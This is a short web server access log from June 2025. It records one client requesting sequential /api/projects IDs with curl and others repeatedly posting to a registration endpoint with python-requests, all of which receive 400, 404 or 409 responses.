146.70.41.18 - - [02/Jun/2025:01:00:30 +0000] "GET /api/projects/10 HTTP/1.1" 404 111 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:36 +0000] "GET /api/projects/12 HTTP/1.1" 404 33 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:40 +0000] "GET /api/projects/20 HTTP/1.1" 404 100 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:48 +0000] "POST /api/auth/register HTTP/1.1" 409 152 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:51 +0000] "GET /api/projects/17 HTTP/1.1" 404 28 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:52 +0000] "POST /api/auth/register HTTP/1.1" 409 173 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:54 +0000] "GET /api/projects/18 HTTP/1.1" 404 53 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:57 +0000] "GET /api/projects/19 HTTP/1.1" 404 87 "-" "curl/7.68.0"
5.181.235.71 - - [02/Jun/2025:02:00:00 +0000] "POST /api/auth/register HTTP/1.1" 409 156 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:01 +0000] "POST /api/auth/register HTTP/1.1" 400 104 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:06 +0000] "POST /api/auth/register HTTP/1.1" 409 191 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:06 +0000] "POST /api/auth/register HTTP/1.1" 409 175 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:10 +0000] "POST /api/auth/register HTTP/1.1" 400 175 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:12 +0000] "POST /api/auth/register HTTP/1.1" 400 198 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:16 +0000] "POST /api/auth/register HTTP/1.1" 400 85 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:16 +0000] "POST /api/auth/register HTTP/1.1" 400 115 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:20 +0000] "POST /api/auth/register HTTP/1.1" 409 148 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:22 +0000] "POST /api/auth/register HTTP/1.1" 409 193 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:28 +0000] "POST /api/auth/register HTTP/1.1" 400 93 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:36 +0000] "POST /api/auth/register HTTP/1.1" 400 111 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:36 +0000] "POST /api/auth/register HTTP/1.1" 409 146 "-" "python-requests/2.28.0"
